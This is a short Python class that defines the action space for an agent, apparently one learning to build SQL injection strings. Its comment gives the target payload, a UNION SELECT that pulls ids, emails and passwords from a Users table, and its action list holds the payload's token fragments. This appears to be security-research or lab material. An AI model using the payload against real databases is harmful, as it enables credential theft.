class ActionSpace:
    def __init__(self):
        # Target: a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--
        self.actions = [
            # 1. Mở đầu & Kết thúc
            "a'))", 
            " FROM Users",
            "--",
            
            # 2. Keywords SQL
            " UNION",
            " SELECT",
            
            # 3. Các cột dữ liệu (kèm dấu phẩy hoặc không để nó tự học cách đặt dấu phẩy)
            " id", 
            " email", 
            " password",
            
            # 4. NULL và Dấu câu
            " NULL",
            "," 
        ]
        self.num_actions = len(self.actions)

    def get_action_string(self, index):
        return self.actions[index]

    def get_action_space_size(self):
        return self.num_actions